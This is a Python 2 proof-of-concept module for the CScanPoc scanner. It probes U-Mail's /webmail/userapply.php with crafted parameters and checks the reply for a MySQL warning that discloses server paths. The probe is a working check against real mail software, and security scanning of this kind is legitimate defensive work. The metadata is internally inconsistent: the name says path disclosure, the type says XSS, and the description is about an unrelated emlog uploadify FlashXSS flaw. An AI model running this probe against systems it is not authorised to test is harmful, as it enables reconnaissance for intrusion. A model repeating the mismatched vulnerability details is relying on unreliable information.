# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'U-Mail_0000' # 平台漏洞编号，留空
    name = 'U-Mail /webmail/userapply.php 路径泄漏' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-03-08'  # 漏洞公布时间
    desc = '''
        emblog include/lib/js/uploadify/uploadify.swf文件存在FlashXss漏洞。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=049525' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fad93042-e33c-43a4-b047-8ce723fa02a2'
    author = '国光'  # POC编写者
    create_date = '2018-05-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(target=self.target) + '/webmail/userapply.php?execadd=333&DomainID=111'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            res = re.compile(r'supplied argument is not a valid MySQL result resource in <b>(.*)</b> on line')
            match = res.findall(content)
            if match:
                if '<b>Warning</b>:' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()